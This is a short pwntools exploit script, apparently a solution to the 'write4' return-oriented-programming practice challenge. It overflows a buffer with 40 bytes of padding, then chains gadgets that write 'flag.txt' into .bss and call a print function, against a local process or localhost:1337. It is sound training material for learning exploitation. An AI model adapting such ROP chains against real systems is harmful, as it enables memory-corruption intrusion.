from pwn import *

def start():
	global chall
	if args.REMOTE:
		chall = remote('localhost', 1337)
	else:
		chall = elf.process()

context.binary = elf = ELF('./write4')
start()


pop_r14_15 = p64(0x400690)
bss_addr = p64(0x601038)
pop_rdi = p64(0x400693)
print_addr = p64(0x400510)
mov_r14_r15 = p64(0x400628) #mov     [r14], r15

payload = b'A' * 40
payload += pop_r14_15
payload += bss_addr
payload += b'flag.txt'
payload += mov_r14_r15
payload += pop_rdi
payload += bss_addr
payload += print_addr
chall.recvuntil(b'> ')
chall.sendline(payload)
chall.interactive()



